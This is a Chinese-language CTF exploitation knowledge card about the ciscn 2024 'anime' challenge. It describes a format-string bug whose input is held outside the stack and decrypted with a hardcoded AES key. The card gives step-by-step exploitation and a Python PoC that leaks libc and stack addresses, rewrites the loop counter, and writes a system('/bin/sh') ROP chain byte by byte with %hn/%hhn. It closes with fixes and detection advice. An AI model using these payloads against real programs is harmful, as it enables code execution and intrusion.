---
id: binary-pwn-format-string-limited-nonstack-loop-condition-byte-rop
title: 有限次非栈上格式化：改循环条件扩充写入次数 + 两级指针 %hn/%hhn 逐字节写 ROP（AES 单块输入）
type: scenario
domain: binary
path: binary/pwn/format-string
technique: format-string-loop-condition-pointer-chain-byte-rop
tags:
- pwn
- format-string
- non-stack
- loop-condition
- hn
- hhn
- arbitrary-write
- rop
- aes
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V154
  verified_at: '2026-11-06T07:37:26+08:00'
  notes: 已对照原文与1张图核对：readline 读 0x40 但 AES_decrypt 仅解首块、明文落 .bss、for(n3=3;n3>0;--n3) 内 printf(format)（图01 IDA 显示 n3 位于 rbp-2Ch、0x15CB 为 printf 调用点）；exp 的 %15$p%19$p 泄露、pwn2 %19$hn 改 arg49 指针、pwn3 %49$hn 写 n3 低16位、rop 用 %19$hn 拨地址+ %49$hhn 写字节、flat(pop_rdi,binsh,ret,system) 均与原文一致；AES key 7bf35cd69c475d5e6f1d7a23187bf934 与 .rodata 图一致。未验证点：原文无成功执行结果，参数槽 19/49、偏移 0x2c/0x29d90/0x100 为该样本实测值（卡内 confidence=medium 已注明）；n3 被改写为低16位栈地址，是否足够大需按目标栈对齐复核；PoC 未本机复跑。frontmatter 无 sources/source_url（全库惯例）。
url: /docs/binary/pwn/format-string/binary-pwn-format-string-limited-nonstack-loop-condition-byte-rop/
draft: false
kb_aliases:
- 有限次格式化字符串
- 非栈上格式化循环写
- 改循环条件扩充写
- AES 单块格式化字符串
- 两级指针格式化写
- ciscn 2024 anime
- '%hhn 逐字节写 ROP'
---

## 一句话结论

当格式化字符串落在 `.bss`、程序只给 3 次输入且输入还要先过 AES 单块解密时，可以先用一次 `%p` 泄露 libc 与栈地址，再用两次 `%hn` 改写栈上的指针槽并篡改循环计数变量，把 3 次机会扩成可持续输入；随后每轮用 `%19$hn` 拨动写指针、用 `%49$hhn` 写一个字节，逐字节把 `pop rdi; "/bin/sh"; ret; system` 的 ROP 链写到返回地址处。

## 原理

- **非栈上格式串**：用户输入经 `readline()` 读入密文、AES 解密后写到全局 `decrypted_password`（`.bss`），`printf(format)` 的格式串本体不在栈上；但 `printf` 解析 `%15$p`、`%19$hn` 等位置参数时仍从当前调用现场的栈取变参，所以“泄露栈/libc”和“借栈槽当写指针”依然成立。
- **AES 单块约束**：程序 `read(0, ciphertext, 0x40)` 看似读了 64 字节，但 `AES_decrypt(ciphertext, decrypted, key)` 是 OpenSSL 的单块接口，只解密第一个 16 字节块。有效明文必须压进 16 字节，超长部分不会被解密成可执行格式串；密钥硬编码在 `.rodata`，因此攻击者可以离线用同一 key/ECB 加密自己的明文格式串再发送，加密不构成障碍。
- **有限次输入**：主循环 `for (n3 = 3; n3 > 0; --n3)` 只给 3 次 `printf(format)`。如果按常规“每轮写一个地址”打法，3 次远远不够写完一条 ROP 链，所以必须先改程序状态。
- **改循环条件**：`n3` 是栈上的局部变量（样本位于 `rbp-0x2c`）。利用 `%hn` 写入“指向该变量的指针槽”，把 `n3` 的低 2 字节改成一个很大的正数（或让判断条件恒真），循环就不会在 3 次后退出，而是继续接受输入；原文用参数槽 19/49 搭出两级指针：`%19$hn` 先改第一层指针，`%49$hn` 再把写落点/循环计数改到目标位置。
- **两级指针写原语**：`%n` 系写入的是“参数槽中保存的地址”所指向的内存。栈上若存在 `arg19 -> 某个栈槽`、`arg49 -> 目标地址` 这类现成指针链，就可以用 `%19$hn` 修改“写指针指向哪里”，再用 `%49$hhn` 向该地址写 1 字节；每轮两条格式串即可完成“定位地址 + 写值”。
- **逐字节写 ROP**：`%hhn` 只写 1 字节，避免了 `%n` 一次写 4/8 字节时输出量过大和值不可控的问题。按 `pop rdi`、`/bin/sh`、`ret`（栈对齐）、`system` 的顺序逐字节覆盖返回地址附近的栈槽，最后函数返回时进入 ROP 链执行 `system("/bin/sh")`。
- **为什么稳定**：同一进程内栈布局与 libc 基址在多轮输入间保持不变，参数索引固定；AES key 固定，payload 可离线预加密；每轮只做两次短格式串，输出长度可控。代价是需要精确的栈偏移/参数索引，且循环计数改写值要足够大。

## 触发条件

- 程序存在 `printf(buf)` 等把用户输入直接当格式串的调用，且输入可控。
- 格式串本体在 `.bss`/堆等非栈位置（非栈上格式化），但 `printf` 参数仍从栈取。
- 输入经过固定密钥的 AES 等单块加解密，且有效明文被限制在一个块内（样本 16 字节）。
- 程序对输入次数有限制（如 3 次 for 循环），且循环计数/判断变量位于可被格式化写触及的栈槽。
- 栈上存在可利用的指针槽（可被 `%hn` 改写的二级指针），能搭出“改地址 + 写字节”的原语。
- 能泄露 libc 与栈地址（如 `%15$p`、`%19$p`），二进制无 PIE 或已泄露代码基址。

## 利用步骤

1. 静态分析：定位 `printf(format)`、`readline()` 的 AES 解密、密钥在 `.rodata` 的地址、主循环计数变量 `n3` 的栈偏移，以及 `printf` 调用点的参数槽布局。
2. 写 AES 辅助函数：用泄露/硬编码的 key 对明文做 ECB 加密并补零到 16 字节，后续所有 payload 都先加密再发送。
3. 第一次输入：发送 `%15$p%19$p`，分别泄露 libc 地址与栈地址；用调试器确认两者到 `libc base`、目标栈槽的固定偏移。
4. 第二次输入：用 `%<delta>c%19$hn` 改写第一层指针槽，使其指向循环计数/写指针附近的栈位置。
5. 第三次输入：用 `%<delta>c%49$hn` 改写第二层写落点或循环条件，使 `n3` 变为大值、循环继续；此时程序从“3 次”变成可持续输入。
6. 循环写 ROP：每轮先发 `%<addr_low>c%19$hn` 把写指针拨到 `stack_ret+i`，再发 `%<byte>c%49$hhn` 写入当前字节；按 8 字节地址逐字节覆盖 `pop rdi`、`/bin/sh`、`ret`、`system`。
7. 写完后让函数返回，触发 ROP；若失败，用 GDB 在 `printf` 调用点检查参数索引、栈槽偏移与 `%hhn` 落点。

## PoC

AES 单块预处理（key 来自样本 `.rodata`）：

```python
from Crypto.Cipher import AES

KEY = bytes.fromhex("7bf35cd69c475d5e6f1d7a23187bf934")
BLOCK = 16

def encrypt_block(plain: bytes) -> bytes:
    assert len(plain) <= BLOCK
    return AES.new(KEY, AES.MODE_ECB).encrypt(plain.ljust(BLOCK, b"\x00"))
```

泄露与两级指针（参数索引/偏移随样本变化）：

```python
PTR_SLOT = 19       # 第一层指针槽
WRITE_SLOT = 49     # 第二层写落点槽

def pwn1():
    return encrypt_block(b'%15$p%19$p')

def pwn2(stack):
    # 改第一层指针，指向循环计数/写指针附近
    return encrypt_block(f"%{(stack - 0x2c) & 0xffff}c%{PTR_SLOT}$hn".encode())

def pwn3(stack):
    # 改第二层落点/循环条件，让 n3 变成大值
    return encrypt_block(f"%{stack & 0xffff}c%{WRITE_SLOT}$hn".encode())
```

逐字节写 ROP：

```python
def rop(data, stack_ret):
    for i, byte in enumerate(data):
        # 1) 把写指针拨到 stack_ret + i
        pay = f"%{(stack_ret + i) & 0xffff}c%19$hn\x00".encode()
        io.send(encrypt_block(pay))
        # 2) 写当前字节
        if byte == 0:
            pay = b"%49$hhn\x00"
        else:
            pay = f"%{byte}c%49$hhn\x00".encode()
        io.send(encrypt_block(pay))
```

```python
payload = flat(pop_rdi, bin_sh, ret, system)
rop(payload, stack_ret)
```

说明：`pop_rdi`、`ret`、`system`、`bin_sh` 由泄露的 libc 基址计算；`stack_ret` 由 `%19$p` 泄露的栈地址减去样本固定偏移得到。原文为 ciscn 2024 `anime`，参数槽 19/49 与 `0x2c` 偏移均为该样本实测值，未在本机复跑。

## 变体与关联

- 变体：不改循环计数，而改 `.fini_array`/`DT_FINI` 让 `main` 重启获得多轮输入（见关联卡），适用于循环计数不可达或退出流程可写的二进制。
- 变体：用 `%hn` 一次写 2 字节减少轮数，或用 `%n` 写 4 字节但需处理巨大输出；`%hhn` 最稳但轮数最多。
- 变体：AES 换成 XOR/RC4 等固定密钥单块加密时，同样可离线预处理 payload；若输入长度不受单块限制，可直接放完整格式串。
- 变体：不写 ROP 而改 `one_gadget`，但寄存器/栈约束更苛刻，成功率不如逐字节 ROP。
- 关联：[[binary-pwn-format-string-non-stack-fini-array-loop-write]]（非栈上格式化的另一种多轮化：`.fini_array` 重启）；[[binary-pwn-format-string-got-hijack]]（栈上目标地址的直接 `%n` 写法）；[[binary-pwn-format-string-canary-libc-leak-rop-system]]（格式化泄露 + ROP 的组合）。
- 关联：CTF 中“输入加密/编码 + 有限次数”常是同一类约束，核心都是先判断有效输入长度与可写次数，再决定是否需要先改程序状态。

## 检测与防御

- 修复：把 `printf(format)` 改为 `printf("%s", format)` 或 `puts(format)`；编译加 `-Wformat-security -Werror=format-security`、`-D_FORTIFY_SOURCE=2`。
- 加固：PIE + ASLR 提高地址预测难度；Full RELRO 保护 GOT/`.fini_array`；栈 Canary 与 NX 作为纵深防御。
- 检测：输入中出现 `%<数字>c`、`%<数字>$hn`、`%<数字>$hhn` 组合；进程在 `printf` 内部崩溃或输出异常长填充；同一连接反复提交短格式串并伴随返回地址变化。
- 检测（加密输入场景）：固定密钥的 AES 单块解密后直接进入 `printf`，可在解密出口对明文做格式串特征扫描；不要因为“输入已加密”就认为格式串安全。
- 防御：不要硬编码加密密钥；对解密后的内容按不可信输入处理，限制格式串中的 `%` 与 `$`，并记录异常格式化行为。
